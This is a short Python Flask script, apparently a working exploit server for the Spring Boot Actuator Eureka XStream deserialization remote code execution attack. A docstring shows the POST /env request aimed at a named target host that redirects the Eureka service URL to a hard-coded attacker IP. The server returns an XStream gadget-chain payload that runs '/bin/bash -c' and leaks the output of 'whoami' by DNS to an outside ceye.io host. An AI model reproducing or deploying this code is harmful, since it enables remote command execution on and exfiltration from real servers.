# -*- coding: utf-8 -*-

from flask import Flask, Response

'''
POST /env HTTP/1.1
Host: open-api.bxapp.cn
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

eureka.client.serviceUrl.defaultZone=http://108.61.103.37:2333/xstream
'''

app = Flask(__name__)

@app.route('/xstream', defaults={'path': ''})
@app.route('/xstream/<path:path>')
def catch_all(path):
    xml = """<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
      <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessageXmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.CollectionsEmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                     <string>/bin/bash</string>
                      <string>-c</string>
                      <string>ping `whoami`.d6pkyf.ceye.io</string>
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIOContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next class="string">foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilderNullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>"""
    return Response(xml, mimetype='application/xml')
if __name__ == "__main__":
    app.run(host='108.61.103.37', port=2333)